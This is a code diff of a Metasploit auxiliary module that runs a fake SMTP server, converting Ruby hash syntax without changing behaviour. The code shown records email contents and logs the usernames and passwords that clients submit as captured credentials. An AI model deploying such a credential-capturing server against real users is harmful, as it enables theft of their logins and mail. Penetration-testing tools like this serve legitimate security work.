@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    @state[c] = {name: "#{c.peerhost}:#{c.peerport}", ip: c.peerhost, port: c.peerport, user: nil, pass: nil}
     c.put "220 SMTP Server Ready\r\n"
   end
 
@@ -68,9 +68,9 @@ class Metasploit3 < Msf::Auxiliary
       idx = @state[c][:data_buff].index("\r\n.\r\n")
       if(idx)
         report_note(
-          :host => @state[c][:ip],
-          :type => "smtp_message",
-          :data => @state[c][:data_buff][0,idx]
+          host: @state[c][:ip],
+          type: "smtp_message",
+          data: @state[c][:data_buff][0,idx]
         )
         @state[c][:data_buff][0,idx].split("\n").each do |line|
           print_status("SMTP: #{@state[c][:name]} EMAIL: #{line.strip}")
@@ -119,13 +119,13 @@ class Metasploit3 < Msf::Auxiliary
       @state[c][:pass] = arg
 
       report_auth_info(
-        :host      => @state[c][:ip],
-        :port      => datastore['SRVPORT'],
-        :sname     => 'pop3',
-        :user      => @state[c][:user],
-        :pass      => @state[c][:pass],
-        :source_type => "captured",
-        :active    => true
+        host: @state[c][:ip],
+        port: datastore['SRVPORT'],
+        sname: 'pop3',
+        user: @state[c][:user],
+        pass: @state[c][:pass],
+        source_type: "captured",
+        active: true
       )
       print_status("SMTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
     end
